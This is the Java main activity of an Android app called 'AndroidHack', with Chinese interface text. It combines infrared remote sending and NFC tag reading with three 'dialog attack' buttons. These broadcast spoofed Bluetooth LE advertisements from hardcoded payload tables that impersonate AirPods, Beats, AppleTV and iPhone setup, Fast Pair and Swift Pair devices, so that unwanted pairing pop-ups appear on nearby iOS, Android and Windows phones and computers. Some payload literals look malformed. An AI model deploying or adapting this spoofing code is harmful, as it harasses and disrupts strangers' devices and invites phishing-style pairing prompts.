package com.cfks.androidhack;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertisingSet;
import android.bluetooth.le.AdvertisingSetCallback;
import android.bluetooth.le.AdvertisingSetParameters;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.content.Context;
import android.content.Intent;
import android.hardware.ConsumerIrManager;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.net.Uri;
import android.nfc.Tag;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.alex.textview.view.LinkTextView;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

import static android.content.ContentValues.TAG;
import static android.content.pm.PackageManager.PERMISSION_GRANTED;

public class MainActivity extends AppCompatActivity implements OnClickListener,NfcUtils.NfcListener {
    private ConsumerIrManager mCIR;
	private TextView MyFreqsText;
	private EditText infraredCode;
	private NfcUtils nfcUtils = NfcUtils.getInstance();
	private TextView NFCtext;
	private BluetoothLeAdvertiser bluetoothLeAdvertiser;
    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
    AdvertisingSet currentAdvertisingSet = null;
    public byte[][] deviceData = {
		/*1_AirPods*/{0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*2_AirPods Pro*/{0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*3_AirPods Max*/{0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*4_AirPods*/{0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*5_AirPods*/{0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*6_AirPods Pro*/{0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*7_Powerbeats3*/{0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*8_Powerbeats Pro*/{0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*9_Beats Solo Pro*/{0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*10_Beats Studio Buds*/{0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*11_Beats Flex*/{0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*12_BeatsX*/{0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*13_Beats Solo3*/{0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*14_Beats Studio3*/{0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*15_Beats Studio Pro*/{0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*16_Beats Fit Pro*/{0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*17_Beats Studio Buds +*/{0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*18_设置AppleTV*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x01, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*19_配对AppleTV*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x20, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*20_AppleTV 验证AppleID*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x2b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*21_AppleTV 隔空投放和HomeKit*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0d, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*22_AppleTV键盘*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x13, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*23_正在连接AppleTV*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x27, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*24_HomePod*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*25_设置新iPhone*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x09, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*26_转移手机号码*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x02, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*27_测量TV色彩平衡*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x1e, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    };
	public byte[][] deviceDataAndroid = {
		{(byte)0x0001F0},
		{0x000047},
		{(byte)0x470000},
		{0x00000A},
		{(byte)0x0A0000},
		{0x00000B},
		{(byte)0x0B0000},
		{(byte)0x0C0000},
		{0x00000D},
		{0x000007},
		{(byte)0x070000},
		{0x000008},
		{(byte)0x080000},
		{0x000009},
		{(byte)0x090000},
		{0x000035},
		{(byte)0x350000},
		{0x000048},
		{(byte)0x480000},
		{0x000049},
		{(byte)0x490000},
		{(byte)0x001000},
		{(byte)0x00B727},
		{(byte)0x01E5CE},
		{(byte)0x0200F0},
		{(byte)0x00F7D4},
		{(byte)0xF00002},
		{(byte)0xF00400},
		{(byte)0x1E89A7},
		/*Flipper Zero*/{(byte)0xD99CA1},
	};
	public byte[][] deviceDataWindows = {
		{(byte)0x030080224861636B2074686520706C616E657422},
	};
    private int spIndex = 0;
    private int interval = 160;
    private int txPowerLevel = 1;
	Random random;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

		Toolbar toolbar=(Toolbar)findViewById(R.id.toolbar);
		setSupportActionBar(toolbar);

		MyFreqsText = findViewById(R.id.freqs_text);
		NFCtext = findViewById(R.id.NFCtext);
		infraredCode = findViewById(R.id.infraredCode);
		findViewById(R.id.get_freqs_button).setOnClickListener(this);
		findViewById(R.id.send1).setOnClickListener(this);
		findViewById(R.id.send2).setOnClickListener(this);
		findViewById(R.id.readNFC).setOnClickListener(this);
		findViewById(R.id.stopNFC).setOnClickListener(this);
		findViewById(R.id.iosDialogAttack).setOnClickListener(this);
		findViewById(R.id.androidDialogAttack).setOnClickListener(this);
		findViewById(R.id.windowsDialogAttack).setOnClickListener(this);

		((LinkTextView) findViewById(R.id.textView1)).setOnLinkClickListener(new LinkTextView.OnLinkClickListener() {
				@Override
				public void onTelLinkClick(String phoneNumber) {
					//Toast.makeText(MainActivity.this, "识别到电话号码是：" + phoneNumber, Toast.LENGTH_SHORT).show();
				}

				@Override
				public void onMailLinkClick(String mailAddress) {
					//Toast.makeText(MainActivity.this, "识别到邮件地址是：" + mailAddress, Toast.LENGTH_SHORT).show();
				}

				@Override
				public void onWebUrlLinkClick(String url) {
					//Toast.makeText(MainActivity.this, "识别到网页链接是：" + url, Toast.LENGTH_SHORT).show();
					final Uri uri = Uri.parse(url);         
					final Intent it = new Intent(Intent.ACTION_VIEW, uri);         
					startActivity(it);
				}
			});
		random = new Random(100);

		mCIR = (ConsumerIrManager) getSystemService(this.CONSUMER_IR_SERVICE);

		nfcUtils.setNfcListener(this);

		AlertDialog dialog = new AlertDialog.Builder(this)
			.setTitle("AndroidHack")
			.setMessage("声明：该软件仅用于学习和交流使用，作者不承担用户使用该软件的任何后果，使用该软件表示用户同意该声明。\n\n本项目Github开源地址:https://github.com/csjdyr001/AndroidHack")
			.setPositiveButton(android.R.string.ok, null)
			.create();
		dialog.setCancelable(false);
		dialog.setCanceledOnTouchOutside(false);
		dialog.show();
    }

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
			case R.id.get_freqs_button:
				if (checkCIR(mCIR)) {
					StringBuilder content = new StringBuilder();
					//获取红外载波频率
					ConsumerIrManager.CarrierFrequencyRange[] frequencyRanges = mCIR.getCarrierFrequencies();
					content.append("红外信号接收数据:");
					for (ConsumerIrManager.CarrierFrequencyRange range:frequencyRanges) {
						content.append(String.format("  %d - %d\n",
													 range.getMinFrequency(), range.getMaxFrequency()));
					}
					MyFreqsText.setText(content.toString());
				} else {
					Toast.makeText(getApplication(), "你的设备不支持红外功能", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.send1:
				if (checkCIR(mCIR)) {
					if (TextUtils.isEmpty(infraredCode.getText().toString())) {
						Toast.makeText(getApplication(), "红外代码不得为空", Toast.LENGTH_SHORT).show();
					} else {
						String data = null;
						data = hex2dec(infraredCode.getText().toString());
						String finallVal = count2duration(data);
						String values[] = finallVal.split(",");
						int frequency = Integer.parseInt(values[0]);
						int[] pattern = new int[values.length - 1];
						for (int i = 0; i < pattern.length; i++) {
							pattern[i] = Integer.parseInt(values[i + 1]);
						}
						if (isSupportedFrequency(mCIR, frequency)) {
							mCIR.transmit(frequency, pattern);
							Toast.makeText(getApplication(), "已发送红外编码", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "你的设备不支持发送该频率的红外编码:" + frequency, Toast.LENGTH_SHORT).show();
						}
					}
				} else {
					Toast.makeText(getApplication(), "你的设备不支持红外功能", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.send2:
				String data = null;
				data = hex2dec(infraredCode.getText().toString());
				String finallVal = count2duration(data);
				String values[] = finallVal.split(",");
				int frequency = Integer.parseInt(values[0]);
				int[] pattern = new int[values.length - 1];
				for (int i = 0; i < pattern.length; i++) {
					pattern[i] = Integer.parseInt(values[i + 1]);
				}
				infrared2audio(frequency, pattern);
				Toast.makeText(getApplication(), "已发送红外编码", Toast.LENGTH_SHORT).show();
				break;
			case R.id.readNFC:
				nfcUtils.onStartNfcAdapter(this);
				nfcUtils.onResumeNfcAdapter(this);//开始扫描NFC
				Toast.makeText(getApplication(), "开始扫描NFC", Toast.LENGTH_SHORT).show();
				break;
			case R.id.stopNFC:
				nfcUtils.onPauseNfcAdapter(this);
				Toast.makeText(getApplication(), "停止扫描NFC", Toast.LENGTH_SHORT).show();
				break;
			case R.id.iosDialogAttack:
				if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
					if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
						bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
						if (bluePermission()) {
							spIndex = random.nextInt(26);
							startAdv(deviceData[spIndex]);
							if (currentAdvertisingSet != null) {
								Log.i("BLE", "device modify successful!");
								currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
																		 .addManufacturerData(0x004c, deviceData[spIndex])
																		 .build());
							}
							stopAdv();
							Toast.makeText(getApplication(), "IOS弹窗攻击发送成功", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "无权限，请授权后重试!", Toast.LENGTH_SHORT).show();
						}
					} else {
						Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
					}
				} else {
					Toast.makeText(this, "您的设备不支持蓝牙或没有蓝牙权限！错误代码：04", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.androidDialogAttack:
				if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
					if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
						bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
						if (bluePermission()) {
							spIndex = random.nextInt(deviceDataAndroid.length - 1);
							startAdv(deviceDataAndroid[spIndex]);
							if (currentAdvertisingSet != null) {
								Log.i("BLE", "device modify successful!");
								currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
																		 .addManufacturerData(0xFE2C, deviceDataAndroid[spIndex])
																		 .build());
							}
							stopAdv();
							Toast.makeText(getApplication(), "Android弹窗攻击发送成功", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "无权限，请授权后重试!", Toast.LENGTH_SHORT).show();
						}
					} else {
						Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
					}
				} else {
					Toast.makeText(this, "您的设备不支持蓝牙或没有蓝牙权限！错误代码：04", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.windowsDialogAttack:
				if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
					if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
						bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
						if (bluePermission()) {
							spIndex = random.nextInt(deviceDataWindows.length - 1);
							startAdv(deviceDataWindows[spIndex]);
							if (currentAdvertisingSet != null) {
								Log.i("BLE", "device modify successful!");
								currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
																		 .addManufacturerData(0x0006, deviceDataWindows[spIndex])
																		 .build());
							}
							stopAdv();
							Toast.makeText(getApplication(), "Windows弹窗攻击发送成功", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "无权限，请授权后重试!", Toast.LENGTH_SHORT).show();
						}
					} else {
						Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
					}
				} else {
					Toast.makeText(this, "您的设备不支持蓝牙或没有蓝牙权限！错误代码：04", Toast.LENGTH_SHORT).show();
				}
				break;
			default:
				break;
		}
	}

	//停止广播
    @SuppressLint("MissingPermission")
    public void stopAdv() {
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
					  + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            bluetoothLeAdvertiser.stopAdvertisingSet(advertisingCallback);
        }
    }

    //开始广播
    @SuppressLint("MissingPermission")
    public void startAdv(byte[] data) {
        AdvertisingSetParameters parameters = new AdvertisingSetParameters.Builder()
			.setLegacyMode(true)
			.setConnectable(false)
			.setInterval(interval)
			.setTxPowerLevel(txPowerLevel)
			.build();
        AdvertiseData Data = new AdvertiseData.Builder()
			.setIncludeDeviceName(false)
			.setIncludeTxPowerLevel(false)
			.addManufacturerData(0x004c, data)
			.build();
        AdvertiseData scanData = new AdvertiseData.Builder()
			.setIncludeTxPowerLevel(true)
			.setIncludeDeviceName(true)
			.build();
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
					  + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            Log.d("BLE", "Advertising Successful!");
            bluetoothLeAdvertiser.startAdvertisingSet(parameters, Data, scanData, null, null, advertisingCallback);
        } else {
            Log.e("BLE", "Advertising Failed! Need Permission.");
            Toast.makeText(this, "程序需要获取权限！错误代码：02", Toast.LENGTH_SHORT).show();
        }
    }

	public boolean checkCIR(ConsumerIrManager cir) {
		return Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && cir.hasIrEmitter();
	}

	public boolean isSupportedFrequency(ConsumerIrManager irService, int targetFreq) {
        for (ConsumerIrManager.CarrierFrequencyRange it : irService.getCarrierFrequencies()) {
            if (it.getMinFrequency() <= targetFreq && targetFreq <= it.getMaxFrequency()) {
                return true;
            }
        }
        return false;
	}

	public String hex2dec(String irData) {
		List<String> list = new ArrayList<String>(Arrays.asList(irData.split(" ")));
		list.remove(0); 
		int frequency = Integer.parseInt(list.remove(0), 16); 
		list.remove(0); 
		list.remove(0); 


		for (int i = 0; i < list.size(); i++) {
			list.set(i, Integer.toString(Integer.parseInt(list.get(i), 16)));
		}


		frequency = (int) (1000000 / (frequency * 0.241246));
		list.add(0, Integer.toString(frequency));


		irData = "";
		for (String s : list) {
			irData += s + ",";
		}
		return irData;
	}

	public String count2duration(String countPattern) {
		List<String> list = new ArrayList<String>(Arrays.asList(countPattern.split(",")));
        int frequency = Integer.parseInt(list.get(0));
        int pulses = 1000000 / frequency;
        int count;
        int duration;
		for (int i = 1; i < list.size(); i++) {
            count = Integer.parseInt(list.get(i));
			duration = count * pulses;
			list.set(i, Integer.toString(duration));
		}

		String durationPattern = "";
        for (String s : list) {
			durationPattern += s + ",";
		}
		return durationPattern;
	}

	public void infrared2audio(int freqOfTone, int[] patterns) {
		// 设置采样率等参数
		int sampleRate = 44100;
		int buffSize = AudioTrack.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_OUT_STEREO, AudioFormat.ENCODING_PCM_16BIT) * 4;
		AudioTrack audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC, sampleRate, AudioFormat.CHANNEL_OUT_STEREO, AudioFormat.ENCODING_PCM_16BIT, buffSize, AudioTrack.MODE_STREAM);

        // 生成PCM音频数
		int numSamples = sampleRate; // 1秒钟的采样点数
		double[] sample = new double[numSamples];
		byte[] generatedSnd = new byte[numSamples * 4]; // 每个采样点占4个字节（16位双声道）

		for (int i = 0; i < numSamples; ++i) {
			sample[i] = Math.sin(2 * Math.PI * i * (freqOfTone / sampleRate));
		}

		int idx = 0;
		for (final double dVal : sample) {
			final short val = (short) (dVal * 32767);
			final short val_minus = (short) -val;

			generatedSnd[idx++] = (byte) (val & 0x00ff);
			generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);
			generatedSnd[idx++] = (byte) (val_minus & 0x00ff);
			generatedSnd[idx++] = (byte) ((val_minus & 0xff00) >>> 8);
		}

        // 发送PCM数据
		List<Byte> listByte = new ArrayList<>();

		for (int j = 0; j < patterns.length; j++) {
			int d = patterns[j];
			final int points = (int) ((((double) d / 1000000.0) * sampleRate) * 4);

			if (j % 2 == 0) {
				for (int i = 0; i < points; i++) {
					listByte.add(generatedSnd[i]);
				}
			} else {
				for (int i = 0; i < points; i++) {
					listByte.add((byte) 0);
				}
			}
		}

        // 播放PCM数据
		try {
			audioTrack.play();
		} catch (IllegalStateException e) {
			Log.e("AudioTrack", e.getMessage());
		}

        // 将List<Byte>转换为byte[]
		byte[] byteArray = new byte[listByte.size()];
		for (int i = 0; i < listByte.size(); i++) {
			byteArray[i] = listByte.get(i);
		}

		audioTrack.write(byteArray, 0, byteArray.length);
	}

    @Override
    protected void onPause() {
        super.onPause();
        nfcUtils.onPauseNfcAdapter(this);       //activity切换到后台的时候停止扫描
    }

    @Override
    public void doing(Tag tag) {
		Toast.makeText(getApplication(), "读取到一个NFC数据", Toast.LENGTH_SHORT).show();
        NFCtext.setText("NFC读取到的数据:" + nfcUtils.ByteArrayToHexString(tag.getId()));   //扫到卡片的时候做的事情。
    }

	//获取蓝牙权限
    private boolean bluePermission() {
        Log.i("BLE", "Requesting Bluetooth Permission...");
        if (android.os.Build.VERSION.SDK_INT > 30) {
            if (ContextCompat.checkSelfPermission(this,
												  "android.permission.BLUETOOTH_ADVERTISE")
				!= PERMISSION_GRANTED
				|| ContextCompat.checkSelfPermission(this,
													 "android.permission.BLUETOOTH_CONNECT")
				!= PERMISSION_GRANTED
				) {
                ActivityCompat.requestPermissions(this, new String[]{
													  "android.permission.BLUETOOTH_ADVERTISE",
													  "android.permission.BLUETOOTH_CONNECT",}, 1);
                return false;
            }
        } else {
            if (ContextCompat.checkSelfPermission(this,
												  "android.permission.ACCESS_FINE_LOCATION")
				!= PERMISSION_GRANTED
				) {
                ActivityCompat.requestPermissions(this, new String[]{
													  "android.permission.ACCESS_FINE_LOCATION",
												  }, 1);
                return false;
            }
        }
        return true;
    }

    //权限获取结果反馈
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            if (grantResults[0] != PERMISSION_GRANTED) {
                if (android.os.Build.VERSION.SDK_INT > 30) {
                    if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_ADVERTISE") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：BLUETOOTH_ADVERTISE", Toast.LENGTH_SHORT).show();
                    }
                    if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_CONNECT") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：BLUETOOTH_CONNECT", Toast.LENGTH_SHORT).show();
                    }
                } else {
                    if (ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_FINE_LOCATION") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：android.permission.ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        }
    }
}

